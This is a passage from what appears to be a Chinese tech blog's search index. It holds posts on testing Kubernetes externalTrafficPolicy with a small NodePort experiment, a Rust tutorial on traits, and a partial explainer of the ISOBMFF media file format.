AllowedIPs = 10.9.0.0/16, 192.168.1.0/24, 172.19.50.0/24 # 和所有设备互通 ","description":"\n","tags":["wireguard","network","tunnel","vpn","homelab"],"title":"\n利用 WireGuard 快速构建属于你自己的虚拟专用网络","uri":"/posts/build-your-own-vpn-with-wireguard/"},{"categories":null,"content":" 关于 Service 的 externalTrafficPolicy, 官方文档的解释感觉有点模糊，看了网上其他人的解释也总感觉没有说到点子上。本文通过一个小实验，帮助你真正理解这个字段的含义和效果，以及相关注意事项。最后，本文总结了两种策略的优缺点。\n在 Kubernetes 中，针对 Service 的外部流量有两种分发策略：\nCluster 节点在收到外部流量后，可以转发给集群中的任意节点（包括自己和其他节点）。 Local 节点在收到外部流量后，只会发送到当前节点的 Pod 中。如果当前节点中没有该 Service 对应的处于 ready 状态的后端 endpoint，则 该流量会被丢弃 。 上面关于两种分发策略的描述，经过我的实验验证并总结得出。\n下面就介绍一下这个小实验，来帮助我们理解和证实上述结论。\n实验环境 环境很简单，布署一个 k8s 集群，包含两个 worker 节点：\nNAME STATUS AGE VERSION INTERNAL-IP gz1 Ready 4d2h v1.33.4+k3s1 192.168.8.1 xjp1 Ready 3d8h v1.33.4+k3s1 172.17.26.70 实验原理 服务部署：\n布署一个 NodePort 类型的 service, externalTrafficPolicy 初始配置为 Cluster 后端仅布署一个 pod 为该 service 提供 endpoint。也就是说，只有一个 node 能够最终处理该 service 的流量。 外部流量策略验证：\nCluster 策略测试：service 的外部流量策略初始为 Cluster 类型，可以直接测试。\n测试方法：分别通过集群中的两个 node 的 IP 来访问该服务。\n预期结果：两个 node 都能正确响应。这表明流量进行了集群范围内的转发，我们的结论得到验证。\nLocal 策略测试：将 service 的 externalTrafficPolicy 配置为 Local。\n测试方法：和 Cluster 一样，分别通过集群中的两个 node 的 IP 来访问该服务。\n预期结果：其中一个 node 可以正确响应，另一个无法正确响应。可以响应的 node 是布署了后端 pod 的 node。这表明流量要么发送到本地 pod, 要么丢弃, 不会转发给其他 node。\nexternalTrafficPolicy 仅针对外部流量有意义，而只有 NodePort, LoadBalancer 这两种类型的 Service 才会直接接收外部流量。简单起见，这里使用 NodePort 类型来测试。\n实验过程 创建 traffic-test deployment 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 apiVersion: apps/v1 kind: Deployment metadata: name: traffic-test spec: replicas: 1 selector: matchLabels: app: traffic-test template: metadata: labels: app: traffic-test spec: containers: - name: whoami image: traefik/whoami ports: - containerPort: 80 注意，这里的 replicas=1, 因此只会有一个 pod 部署在其中一个 node 上：\n1 kubectl get pods -lapp=traffic-test -o wide 1 2 NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES traffic-test-7787c8cc97-pm6k8 1/1 Running 0 107m 10.42.1.59 xjp1 \u003cnone\u003e \u003cnone\u003e 可以看到，该 pod 部署在 node xjp1 上。\n创建 traffic-test service 1 2 3 4 5 6 7 8 9 10 11 12 13 apiVersion: v1 kind: Service metadata: name: traffic-test spec: selector: app: traffic-test ports: - protocol: TCP port: 80 targetPort: 80 type: NodePort externalTrafficPolicy: Cluster 注意：\nService 类型设置为 NodePort 类型\nexternalTrafficPolicy 初始设置为 Cluster\n查看一下 Service 的 NodePort 端口号：\n1 kubectl get svc traffic-test 1 2 NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE traffic-test NodePort 10.43.203.41 \u003cnone\u003e 80:30316/TCP 104m 可以看到， service 映射到了主机的 30316 端口上。后面我们可以通过地址 nodeIP:30316 来访问该服务。\n测试 Cluster 流量策略 由于该服务为 NodePort 类型，且 externalTrafficPolicy 设置为 Cluster, 那么按照 Cluster 的定义，我们应该可以在集群外部，通过集群中任意节点的 IP 访问到该服务。\n我们通过测试来验证一下。\n测试节点1: 通过 xjp1 节点访问该 service。\n参考 创建 traffic-test deployment 一节，xjp1 正是 service 对应的 pod 所在的节点。参考实验环境, 该节点 IP 为 172.17.26.70。\n1 curl -s 172.17.26.70:30316 1 2 3 4 5 6 7 8 9 10 Hostname: traffic-test-7787c8cc97-pm6k8 IP: 127.0.0.1 IP: ::1 IP: 10.42.1.59 IP: fe80::d496:16ff:fe3d:5e74 RemoteAddr: 10.42.1.1:25389 GET / HTTP/1.1 Host: 172.17.26.70:30316 User-Agent: curl/8.7.1 Accept: */* ✅ xjp1 节点访问成功。\n测试节点2: 通过 gz1 节点访问服务。\n该节点上没有布署 service 对应的 pod。参考实验环境, 其 IP 为 192.168.8.1：\n1 curl -s 192.168.8.1:30316 1 2 3 4 5 6 7 8 9 10 Hostname: traffic-test-7787c8cc97-pm6k8 IP: 127.0.0.1 IP: ::1 IP: 10.42.1.59 IP: fe80::d496:16ff:fe3d:5e74 RemoteAddr: 10.42.0.0:18798 GET / HTTP/1.1 Host: 192.168.8.1:30316 User-Agent: curl/8.7.1 Accept: */* ✅ gz1 节点访问成功。\n有两点值得注意：\ngz1 节点上并未部署该 service 对应的后端 pod, 但仍然可以通过该节点将流量路由到其后端 endpoint, 说明 Cluster 策略生效了。\n两次测试返回的 RemoteAddr 都是集群内部的 IP, 而不是客户端 IP。这是因为流量可能需要经过 node 转发，所以会统一做一次 SNAT, 将流量的源 IP 地址修改为 node 的 IP 地址。因此， 会丢失原始客户端的源 IP 地址 。这是 Cluster 模式的一个副作用。\n测试 Local 流量策略 首先将服务的 .spec.externalTrafficPolicy 修改成 Local 类型：\n1 kubectl patch svc traffic-test -p '{\"spec\": {\"externalTrafficPolicy\": \"Local\"}}' 1 service/traffic-test patched 确认一下修改是否成功：\n1 kubectl get svc traffic-test -o yaml | yq '.spec.externalTrafficPolicy' 1 Local 确认已经修改成 Local 了。\n按照 Local 的定义，并结合我们的配置，应该只有一个节点 (xjp1) 可以正确相应请求，另一个节点会因为流量无法路由到服务对应的 pod 而超时失败。\n我们通过重复 测试 Cluster 流量策略 中的两个测试，来验证一下。\n测试节点1: 通过 xjp1 访问服务:\n1 curl -s 172.17.26.70:30316 1 2 3 4 5 6 7 8 9 10 Hostname: traffic-test-7787c8cc97-pm6k8 IP: 127.0.0.1 IP: ::1 IP: 10.42.1.59 IP: fe80::d496:16ff:fe3d:5e74 RemoteAddr: 192.168.22.2:61899 GET / HTTP/1.1 Host: 172.17.26.70:30316 User-Agent: curl/8.7.1 Accept: */* ✅ xjp1 节点访问成功。\n而且，RemoteAddr 获取正确，正是真实的客户端 IP 地址。\n测试节点2: 通过 gz1 访问服务:\n1 curl -s --connect-timeout 1 192.168.8.1:30316 || echo timeout 1 timeout ❌ gz1 节点访问失败。\n这是符合预期的，因为 gz1 上面没有 service traffic-test 对应的后端 pod, 在外部流量策略为 Local 的情况下，流量会被丢弃。这印证了我们文章开头的结论，即： Local 模式不会将流量转发给其他 node。\n结论总结 Cluster 节点在收到外部流量后，可以转发给集群中的任意节点（包括自己和其他节点）。 优点：\n负载均衡： Cluster 的分发策略可以确保流量在不同的后端负载之间均衡分发。\n高可用性： 即使某个节点出现故障，只要还有其他节点有部署该 service 对应的 endpoint, 便可以提供服务。\n缺点：\n性能开销：需要做一次 SNAT，并且可能导致第二跳 (second hop) 到另一个节点，性能上略有影响。\n丢失客户端 IP：由于做了一次 SNAT, 后端 pod 无法获得客户端的真实 IP 地址。\nLocal 节点在收到外部流量后，只会发送到当前节点的 Pod 中。如果当前节点中没有该 Service 对应的处于 ready 状态的后端 endpoint，则 该流量会被丢弃 。 优点：\n性能：相比 Cluster 策略，由于不需要做 SNAT 且不存在第二跳，性能上更有优势。\n保留客户端 IP：由于不需要做 SNAT，客户端 IP 得以保留。\n缺点：\n负载均衡： 依赖外部负载均衡器的实现，由于外部负载均衡器不知道每个节点上作为目标的 pod 数量，因此较难保证负载均衡。\n高可用性： 如果某个节点收到流量，但该节点没有部署对应的目标 pod，或者该 pod 出现故障，则会导致服务不可用。\n","description":"\n","tags":["kubernetes"],"title":"\n一个小实验理解 Kubernetes 的外部流量策略 (externalTrafficPolicy)","uri":"/posts/understand-k8s-external-traffic-policy/"},{"categories":null,"content":"这篇文章介绍了一系列 Rust 中利用 trait 实现的通用能力或惯用法，这些内容也是 Rust 编程中较常见的概念、方法和技巧，实用性很强，我称之为“Trait+ 系列”。\n建议先阅读 Rust 中的特征 (Trait) 一文，配合食用效果更佳。\nTrait + 类型转换 From 和 Into From 和 Into trait 规定了一种惯用的类型转换方式。实现了 From, 就可以“免费”获得 Into:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 use std::convert::From; #[derive(Debug)] struct Number { value: i32, } impl From\u003ci32\u003e for Number { fn from(item: i32) -\u003e Self { Number { value: item } } } fn main() { let num = Number::from(30); println!(\"My number is {:?}\", num); let num: Number = 40.into(); println!(\"My number is {:?}\", num); } 1 2 My number is Number { value: 30 } My number is Number { value: 40 } TryFrom 和 TryInto 和 From, Into 类似，只不过返回的是 Result:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 use std::convert::TryFrom; use std::convert::TryInto; #[derive(Debug, PartialEq)] struct EvenNumber(i32); impl TryFrom\u003ci32\u003e for EvenNumber { type Error = (); fn try_from(value: i32) -\u003e Result\u003cSelf, Self::Error\u003e { if value % 2 == 0 { Ok(EvenNumber(value)) } else { Err(()) } } } fn main() { // TryFrom assert_eq!(EvenNumber::try_from(8), Ok(EvenNumber(8))); assert_eq!(EvenNumber::try_from(5), Err(())); // TryInto let result: Result\u003cEvenNumber, ()\u003e = 8i32.try_into(); assert_eq!(result, Ok(EvenNumber(8))); let result: Result\u003cEvenNumber, ()\u003e = 5i32.try_into(); assert_eq!(result, Err(())); } String 转换 转换成 String: fmt::Display 一个类型要转换成 String, 一般会实现 fmt::Display trait, 而不是 ToString (参考“一揽子实现”中的说明):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 use std::fmt; struct Circle { radius: i32 } impl fmt::Display for Circle { fn fmt(\u0026self, f: \u0026mut fmt::Formatter) -\u003e fmt::Result { write!(f, \"Circle of radius {}\", self.radius) } } fn main() { let circle = Circle { radius: 6 }; println!(\"{}\", circle.to_string()); } 1 Circle of radius 6 解析 String: FromStr 一个类型要支持从一个字符串中解析出来，需要实现 FromStr trait:\n1 2 3 4 5 6 7 fn main() { let parsed: i32 = \"5\".parse().unwrap(); let turbo_parsed = \"10\".parse::\u003ci32\u003e().unwrap(); let sum = parsed + turbo_parsed; println!(\"Sum: {:?}\", sum); } 1 Sum: 15 Box\u003cdyn Trait\u003e 的 downcast 我有一个 trait 的包装类型 Box\u003cdyn Trait\u003e 的变量，如何获得其底层的具体类型的引用呢？即如何获得该变量对应的实现该 trait 的 struct 的引用呢？\n这是一个 downcast 的过程，类似于 C++ 中的 dynamic_cast 。\nRust 中应该怎么做？这就要用到一个叫做 Any 的 trait。示例如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 use std::any::Any; pub trait Counter { fn inc(\u0026mut self); fn as_any_mut(\u0026mut self) -\u003e \u0026mut dyn Any; } pub struct ConcreteCounter { pub count: u8, } impl ConcreteCounter { pub fn new() -\u003e ConcreteCounter { ConcreteCounter { count: 1 } } } impl Counter for ConcreteCounter { fn inc(\u0026mut self) { self.count += 1; println!(\"count: {}\", self.count); } fn as_any_mut(\u0026mut self) -\u003e \u0026mut dyn Any { self } } fn main() { let counter = ConcreteCounter::new(); let mut dyn_counter: Box\u003cdyn Counter\u003e = Box::new(counter); // counter: \u0026mut ConcreteCounter let counter = dyn_counter .as_any_mut() .downcast_mut::\u003cConcreteCounter\u003e() .expect(\"dyn_counter is not a ConcreteCounter\"); counter.inc(); counter.count = 0; counter.inc(); } 1 2 count: 2 count: 1 大概步骤如下：\nBox\u003cdyn Counter\u003e → \u0026mut dyn Any (或者 \u0026dyn Any, 如果不需要可变引用)\n这里需要 Counter 包含一个 as_any_mut 方法，以便在 ConcreteCounter 中实现。\n\u0026mut dyn Any → \u0026mut ConcreteCounter\n这是通过调用 Any 的 downcast_mut (对应不可变引用是 downcast_ref) 方法实现的。\n类似地， \u0026dyn Trait 也可以通过上述方法来获取其底层具体的 struct 的引用。\nTrait + 闭包 (Closure) 根据闭包 (closure) 处理参数的方式，闭包会自动实现以下三个 Fn traits 中的一个或多个：\nFnOnce 适用于可以调用一次的闭包。所有闭包都会至少实现该 trait, 因为所有的闭包都可以被调用。\n一个闭包如果将捕获的值 move 到闭包外部，则该闭包将仅实现该 FnOnce 而不会实现其他 Fn traits, 因为该闭包只能被调用一次。\nFnMut 适用于如下闭包：这类闭包不会将捕获的值 move 到闭包外部，但可能会修改捕获的值。这类闭包可以被调用多次。\nFn 适用于如下闭包：这类闭包不会将捕获的值 move 到闭包外部，也不会修改捕获的值，或者根本不捕获任何值。\n这类闭包可以被调用多次，且不会修改环境（对环境无副作用），这在并发多次调用闭包等场景下非常重要。\n以上 trait 对闭包的要求按照顺序逐渐递增： FnOnce 对闭包没有任何特殊要求，而 Fn 的要求最严格。\nFnOnce 的例子 Option\u003cT\u003e.unwrap_or_else 方法中的闭包参数就声明了 FnOnce 约束，意味着该方法可以接受任意类型的闭包：\n1 2 3 4 5 6 7 8 9 10 11 impl\u003cT\u003e Option\u003cT\u003e { pub fn unwrap_or_else\u003cF\u003e(self, f: F) -\u003e T where F: FnOnce() -\u003e T { match self { Some(x) =\u003e x, None =\u003e f(), } } } 💡 一个普通函数也可以实现全部三个 Fn traits。\n如果不需要从环境中捕获值，我们可以在需要传入某个 Fn trait 的地方使用函数名而非闭包。例如：在一个 Option\u003cVec\u003cT\u003e\u003e 上调用 unwrap_or_else(Vec::new), 当该 option 为 None 时，我们可以获得一个新的空 vector。\nFnMut 的例子 下面的示例演示了通过 sort_by_key 方法给数组排序。该方法接受 FnMut 闭包 (或者 Fn 闭包), 原因是它会调用该闭包多次，每个 item 一次。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #[derive(Debug)] struct Rectangle { width: u32, height: u32, } fn main() { let mut list = [ Rectangle { width: 10, height: 1 }, Rectangle { width: 3, height: 5 }, Rectangle { width: 7, height: 12 }, ]; list.sort_by_key(|r| r.width); println!(\"{:#?}\", list); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 [ Rectangle { width: 3, height: 5, }, Rectangle { width: 7, height: 12, }, Rectangle { width: 10, height: 1, }, ] 如果你传入一个仅实现 FnOnce 的闭包，则会编译失败，例如：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #[derive(Debug)] struct Rectangle { width: u32, height: u32, } fn main() { let mut list = [ Rectangle { width: 10, height: 1 }, Rectangle { width: 3, height: 5 }, Rectangle { width: 7, height: 12 }, ]; let mut sort_operations = vec![]; let value = String::from(\"by key called\"); list.sort_by_key(|r| { sort_operations.push(value); // value 被 move out 了，编译失败❗ r.width }); println!(\"{:#?}\", list); } 编译器报告的错误如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 error[E0507]: cannot move out of `value`, a captured variable in an `FnMut` closure --\u003e src/main.rs:19:30 | 16 | let value = String::from(\"by key called\"); | ----- captured outer variable 17 | 18 | list.sort_by_key(|r| { | --- captured by this `FnMut` closure 19 | sort_operations.push(value); // value 被 move out 了，编译失败❗ | ^^^^^ move occurs because `value` has type `String`, which does not implement the `Copy` trait For more information about this error, try `rustc --explain E0507`. error: could not compile `cargoUnHfvy` (bin \"cargoUnHfvy\") due to previous error 由于该闭包将 value move 到闭包外部，该闭包仅实现了 FnOnce trait (只能被调用一次), 因此不符合 FnMut 的规范。\n相反，下面的例子是合法的，因为该闭包仅捕获了 mutable 引用，没有对捕获的变量进行 move 操作，因此符合 FnMut 的规范（可以被多次调用）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #[derive(Debug)] struct Rectangle { width: u32, height: u32, } fn main() { let mut list = [ Rectangle { width: 10, height: 1 }, Rectangle { width: 3, height: 5 }, Rectangle { width: 7, height: 12 }, ]; let mut num_sort_operations = 0; list.sort_by_key(|r| { num_sort_operations += 1; r.width }); println!(\"{:#?}, sorted in {num_sort_operations} operations\", list); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 [ Rectangle { width: 3, height: 5, }, Rectangle { width: 7, height: 12, }, Rectangle { width: 10, height: 1, }, ], sorted in 6 operations Trait + 所有权 (Ownership) Rust 在处理 ownership 规则时，会根据类型是否实现了 Copy trait 来区别对待。具体而言：\n实现了 Copy trait 的类型，其值可以被存储在栈上。 实现了 Copy trait 的类型，在赋值和传参时，不会发生 move, 而是直接拷贝。 未实现 Copy trait 的类型，在赋值和传参时，会发生 move, 之后不再有效。 实现了 Drop trait 的类型，在其 owner 超出作用域范围时，会调用其 drop 方法。 💡 如果一个类型（或者该类型的一部分）实现了 Drop trait, 则不能实现 Copy trait。这二者是互斥的，如果同时存在，会导致编译错误。\nCopy trait 存储在 stack 上的数据拷贝速度很快，而且深拷贝和浅拷贝没有任何区别，因此可以直接采用 copy 的方式处理。Rust 通过 Copy trait 来标识这类数据。\n以下是一些常见的实现了 Copy trait 的类型：\n标量类型（Scalar types）由于 size 固定，可以直接存储在栈上。 元组（Tuple）如果只包含实现了 Copy trait 的类型，则也被视为实现了 Copy trait。 例如 (i32, i32) 实现了 Copy, 但 (i32, String) 则未实现。 Drop trait 存储在 heap 上的数据一般 size 不确定，且拷贝成本较高，因此采用 move 的方式处理。\n这类数据在超出作用域范围时，往往需要做一些特殊处理以便回收内存或释放资源，因此需要实现 Drop trait。\n针对这类型数据，如果在某些场合确实需要进行“深拷贝”操作，可以通过显式调用对象的 clone() 方法手动进行深拷贝。\n实现了 Drop trait 的类型示例：\nBox Vec String File Process Drop trait 使用示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 struct Droppable { name: \u0026'static str, } impl Drop for Droppable { fn drop(\u0026mut self) { println!(\"\u003e Dropping {}\", self.name) } } fn main() { let _a = Droppable { name: \"a\" }; // block A { let _b = Droppable { name: \"b\" }; // block B { let _c = Droppable { name: \"c\" }; let _d = Droppable { name: \"d\" }; println!(\"Exiting block B\"); } println!(\"Just exited block B\"); println!(\"Exiting block A\"); } println!(\"Just exited block A\"); // 手动触发 drop drop(_a); println!(\"end of the main function\"); } 1 2 3 4 5 6 7 8 9 Exiting block B \u003e Dropping d \u003e Dropping c Just exited block B Exiting block A \u003e Dropping b Just exited block A \u003e Dropping a end of the main function String 类型 执行 let s2 = s1; 时发生的事情（参考下方的 String 内存布局图）：\nptr, len, capacity 都是存储在 stack 上的，因此会直接拷贝。 ptr 指向的字符串数据存储在 heap 上，不会发生拷贝，而是被 move 了。 String s1 的内存布局：\n隐含的设计上的选择 🌟 Tips\nRust 永远不会为你的数据自动创建“深拷贝”。\n因此，任何自动发生的拷贝都可以认为是成本较低的（就运行时性能而言）。\nTrait + 解引用 (Deref) 通过实现 Deref trait, 可以自定义类型的解引用操作符 (dereference operator) * 的行为。\n不仅如此，Rust 还支持隐式 Deref 强制转换 (Deref Coercion)。下面重点解释一下这一概念。\n隐式 Deref 强制转换的特点 Deref coercion 作用在函数和方法的参数上，可以自动将一种类型的引用转换为另一种类型的引用。要求被转换的类型实现了对应的 Deref trait。 Deref coercion 可以按需连续转换多次，以获得参数所需类型的引用。 Deref coercion 发生在编译期，因此没有额外的运行时开销（符合零成本抽象原则 Zero Cost Abstractions ）。 隐式 Deref 强制转换示例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 use std::ops::Deref; struct MyBox\u003cT\u003e(T); impl\u003cT\u003e MyBox\u003cT\u003e { fn new(x: T) -\u003e MyBox\u003cT\u003e { MyBox(x) } } impl\u003cT\u003e Deref for MyBox\u003cT\u003e { type Target = T; fn deref(\u0026self) -\u003e \u0026Self::Target { \u0026self.0 } } fn need_a_ref(x: \u0026i32) { println!(\"{}\", x); } fn hello(name: \u0026str) { println!(\"Hello, {name}!\"); } fn main() { let x = 5; let y = MyBox::new(x); assert_eq!(5, *y); // 这里传参时发生了 Deref coercion, 将 \u0026MyBox\u003ci32\u003e 自动转换成 \u0026i32 need_a_ref(\u0026y); let m = MyBox::new(String::from(\"Rust\")); // 下面两行是等价的 hello(\u0026m); // 使用了隐式 Deref 强制转换 hello(\u0026(*m)[..]); // 未使用隐式 Deref 强制转换 } 1 2 3 5 Hello, Rust! Hello, Rust! Deref 和 DerefMut 强制转换规则 在隐式转换中，如果原参数是可变引用 (\u0026mut), 需要转换的目标参数也是可变引用，则必须实现 DerefMut trait 才能支持。\n具体规则如下：\n\u0026T → \u0026U 当 T: Deref\u003cTarget=U\u003e \u0026mut T → \u0026mut U 当 T: DerefMut\u003cTarget=U\u003e \u0026mut T → \u0026U 当 T: Deref\u003cTarget=U\u003e Trait + 迭代器 为了说明 trait 在迭代器中的作用，我们先思考一个开发过程中常遇到的问题：\n当我们有一个 Result 数组/列表时，如何快速判断这个 Result 列表里面是否存在错误？ 你会怎么做呢？\n当然，你可以遍历这个列表，然后逐个判断。但是 Iterator.collect 方法可以帮助我们更加优雅的做到这一点，并且更加的符合 Rustaceans 的习惯:\n1 2 3 4 5 6 7 8 9 10 11 12 let results = vec![Ok(1), Err(\"nope\"), Ok(3), Err(\"bad\")]; let result: Result\u003cVec\u003c_\u003e, \u0026str\u003e = results.into_iter().collect(); // gives us the first error assert_eq!(Err(\"nope\"), result); let results = [Ok(1), Ok(3)]; let result: Result\u003cVec\u003c_\u003e, \u0026str\u003e = results.into_iter().collect(); // gives us the list of answers assert_eq!(Ok(vec![1, 3]), result); 类似地，也可以利用 collect 方法将一个 Option 列表转换成一个 Option:\n1 2 3 4 5 6 7 8 9 10 11 12 let results = vec![Some(1), None, Some(3), None]; let result: Option\u003cVec\u003c_\u003e\u003e = results.iter().cloned().collect(); // gives us the first None assert_eq!(None, result); let results = [Some(1), Some(3)]; let result: Option\u003cVec\u003c_\u003e\u003e = results.iter().cloned().collect(); // gives us the list of answers assert_eq!(Some(vec![1, 3]), result); collect 方法是如何做到的呢？答案就在 Result 和 Option 这两个类型的 FromIterator trait 的实现上。\ncollect 的行为取决于它的目标类型，具体来说，取决于目标类型的 FromIterator trait 的实现。不同的类型会实现自己独有的 FromIterator 逻辑，据此来定义如何从一个迭代器中的元素构建自己。\n对于 Result 类型， FromIterator 被实现为：\n如果迭代器中的元素都是 Ok, 则返回一个 Ok, 其中包含迭代器中所有 Ok 值的集合。 如果迭代器中存在任何 Err, 则返回第一个 Err 。 对于 Option 类型， FromIterator 的实现也是类似的，这里不再赘述。\nTrait + 错误处理 传播错误 (Propagating Errors) Rust 采用传播错误（即函数返回值）的形式来处理“可恢复性错误” (recoverable errors)，而不是异常机制。\n下面是一个例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 use std::fs::File; use std::io::{self, Read}; fn read_username_from_file() -\u003e Result\u003cString, io::Error\u003e { let username_file_result = File::open(\"hello.txt\"); let mut username_file = match username_file_result { Ok(file) =\u003e file, Err(e) =\u003e return Err(e), }; let mut username = String::new(); match username_file.read_to_string(\u0026mut username) { Ok(_) =\u003e Ok(username), Err(e) =\u003e Err(e), } } 我们可以使用问号运算符 (question mark operator) ? 来简化错误传播。上述代码等价于：\n1 2 3 4 5 6 7 8 9 use std::fs::File; use std::io::{self, Read}; fn read_username_from_file() -\u003e Result\u003cString, io::Error\u003e { let mut username = String::new(); // 使用问号运算符，表达式匹配 Err 时立即执行 return File::open(\"hello.txt\")?.read_to_string(\u0026mut username)?; Ok(username) } 除了在遇到错误时执行 early return, ? 运算符还额外提供错误类型的自动转换功能。具体而言，如果发生的错误和函数的返回值声明中的错误类型不同，只要该错误类型实现了相应的 From trait, 则会进行自动转换。例如：\n返回的 Result 类型声明为 Result\u003cString, OurError\u003e （ OurError 为自定义的错误类型），函数体中返回了 io::Error 类型的错误。 OurError 实现了 impl From\u003cio::Error\u003e for OurError 。 ? 运算符会自动执行 from 转换，将 io::Error 转换为 OurError 并返回。 main 函数的返回值 main 函数可以返回两类值：\nResult\u003cT, E\u003e 返回 Ok\u003cT\u003e 表示成功， Err\u003cE\u003e 表示失败。 Termination trait 该 trait 包含一个 report 方法，用来返回一个 ExitCode。 Trait + 并发 Send, Sync 在 Rust 中，有一种 trait 被称为 marker trait, 即不包含任何方法定义，只是一个标记，表明该类型具有某种特殊性质。 Send 和 Sync 就是 marker trait, 二者在并发编程中起到很关键的作用。\nSend trait 允许跨线程移动（转移所有权） 被标记为实现了 Send trait 的类型，表明其值可以跨线程移动。\n大部分类型都被自动标记为 Send 类型：\n几乎所有的基本类型都是 Send （裸指针除外） 任何由 Send 类型组成的类型，都会自动标记为 Send Sync trait 允许跨线程共享（共享引用） 被标记为 Sync 的类型，表明其值允许从多个线程引用，即：\n当且仅当 \u0026T 是 Send 时， T 是 Sync 。\n和 Send 类似，几乎所有的原始类型都是 Sync, 由 Sync 类型组成的类型也是 Sync 。\nUnpin, !Unpin 参见 Rust 中的 Pin, Unpin 和 !Unpin​ 。\n","description":"\n","tags":["rust"],"title":"\nRust Trait+ 系列","uri":"/posts/rust-trait-plus-series/"},{"categories":null,"content":"前段时间用 Rust 写了一个 Exif/Metadata 解析库 nom-exif，里面涉及到对 ISOBMFF 的解析，趁着还有点印象，总结一下这种文件格式。\nISOBMFF 英文全称 ISO Base Media File Format ，顾名思义主要用于封装多媒体文件。 ISOBMFF 最初直接基于 Apple 的 QuickTime 容器格式，然后由 MPEG 开发并标准化为 ISO/IEC 14496-12 。\n该格式已广泛用于媒体文件存储，并作为各种其他媒体文件格式（例如 MP4 和 3GP 容器格式）的基础。\n哪些文件类型在使用 ISOBMFF? 下面这个表格列举了常见的使用了 ISOBMFF 格式的文件：\n文件类型 互联网媒体类型（MIME） 常用扩展名 QuickTime video/quicktime .mov, .movie, .qt HEIF image/heif, image/heic .heif, .heifs; .heic, .heics; .avci, .avcs; .HIF MP4 video/mp4, audio/mp4 .mp4, .m4a, .m4p, .m4b, .m4r, .m4v 3GP video/3gpp .3gp, 3g2 JPEG 2000 image/jp2, image/jpx .jp2, .j2k, .jpf, .jpm, .jpg2, .j2c, .jpc, .jpx, .mj2 Flash Video video/x-flv .flv, .fla, .f4v, .f4a, .f4b, .f4p ISOBMFF 文件结构概述 ISOBMFF 文件由 Box (也叫 Atom) 组成，并且每个 Box 内部都可以任意嵌套，组成一棵 Box 树。顶层 Box 可以有多个。\n一个典型的 ISOBMFF 文件结构如下图所示（以 MP4 文件为例）：\n如上图所示，一个正常的 ISOBMFF 文件，第一个顶层 Box 一般是 type 为 “ftyp” 的 Box 1。通过解析 ftyp Box, 我们可以：\n检测该文件是否是 ISOBMFF 格式。 识别该文件的具体文件类型。例如是 QuickTime, 或者 HEIF 等。 具体怎么做我们在 ftyp Box 一节中介绍。\n除了约定第一个 Box 是 ftyp Box, 后面的 Box 就没有任何限制了，不同的文件类型都可能不同。\n基本 Box 结构 下面是一个最简单的 Box 结构：\nbytes description example 4 box_size, 含自身 4 box_type “ftyp”, “meta” box_size - 8 box_data ftyp Box 对于 ftyp Box 来说，box_data 里面存放的就是该文件的文件类型信息，其结构如下表所示：\nbytes description example 4 Major brand, 文件格式代码 “qt “: QuickTime, “heic”: HEIC 4 Minor version, 文件格式规范版本 目前很少使用 box_size - 8 - 8 Compatible brands, 兼容的文件格式，四字节一个，可能有多个 “mif1MiHEmiafMiHBheic” 有了上述 ftyp box_data 的结构，我们就可以很容易对 ftyp Box 进行解析，从而判断该文件是否是 ISOBMFF, 以及识别出具体的文件类型。\n几种特殊的 Box 类型 除了基本的 Box 结构，还有几种比较特殊的 Box 类型：\nsize 为 1 的 Box (扩展尺寸 Box) size 为 0 的 Box wide Box 下面我们逐一介绍。\nsize 为 1 的 Box (扩展尺寸 Box) 如果 box_size == 1, 则表示 box_size 超过 4 字节上限，Box 结构变成：\nbytes description example 4 box_size == 1 4 box_type “ftyp”, “meta” 8 extended_size extended_size - 16 box_data 从上面的结构中可以看到，实际的 Box 长度变成了 extended_size, 长度的存储空间扩展为 8 字节。\nsize 为 0 的 Box 如果 box_size == 0, 并不意味着该 Box 长度为 0。这种 Box 只能是顶层 Box, 并且只能是最后一个 Box, 其长度一直延伸至文件末尾。其结构如下所示：\nbytes description example 4 box_size == 0 4 box_type “ftyp”, “meta” * box_data, 长度一直延伸到文件末尾 wide Box wide Box 比较有意思，其结构如下：\nbytes description example 4 box_size == 8 4 box_type == “wide” “wide” 可以看到，wide Box 的长度固定为 8, box_type 固定为 “wide”, 且没有 box_data。\nwide box 的作用是为了预留出 8 个字节的空间，这个 8 字节空间可能用来干嘛呢？答案就在名字上 —— “wide”, 顾名思义，是用于扩展 Box 长度的。下面我们具体解释一下。\nwide Box 后面紧挨着的 Box (命名为 Box B 吧), 一般是一个普通的 size 为 4 字节的 Box。如果将来某一天，B 的长度不够，需要括容，则可以按照下面的步骤操作：\n将 wide Box 的 size 改成 1 将 wide Box 的 type 修改为 B 的 type 将 B 的 size 填充到 B 的头 8 个字节（即 size + type 部分） 这样，就完成了 Box B 从 4 字节长度到 8 字节长度的原地括容。这种方式的好处是，B 的 data 部分的 offset 可以保持不变。\nFull Box 有些 Box 为了进一步控制其 data 部分的结构和处理方式，会在 size/type 后面增加四个字节，其中一个字节为 version, 三个字节为 flags, 这类 Box 我们称为 Full Box。\nFull Box 结构示意：\nbytes description example 4 box_size 4 box_type “ftyp”, “meta” 1 version 3 flags box_size - 12 box_data version 和 flags 的含义根据 Box 类型的不同而不同。\n除了增加了 version 和 flags 字段之外，Full Box 和普通 